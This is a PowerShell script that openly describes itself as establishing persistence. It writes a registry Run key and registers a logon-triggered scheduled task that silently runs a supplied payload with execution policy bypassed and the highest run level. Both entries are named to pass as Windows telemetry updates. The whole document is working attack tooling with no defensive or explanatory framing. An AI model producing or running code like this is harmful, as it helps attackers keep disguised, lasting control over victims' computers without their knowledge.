<#
.SYNOPSIS
    Establishes persistence via registry autorun and scheduled task.
.DESCRIPTION
    Creates a registry key and scheduled task to silently run a payload at login.
#>

param (
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath
)

$TaskName = "WindowsTelemetryUpdate"
$RegistryKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$ScriptFullPath = Resolve-Path $PayloadPath

# Registry persistence
Set-ItemProperty -Path $RegistryKey -Name "TelemetryUpdate" -Value "`"$ScriptFullPath`""
Write-Host "[+] Registry persistence added."

# Scheduled Task persistence
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$ScriptFullPath`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -Description "System Update Telemetry" -User $env:USERNAME -RunLevel Highest -Force

Write-Host "[+] Scheduled task '$TaskName' registered successfully."
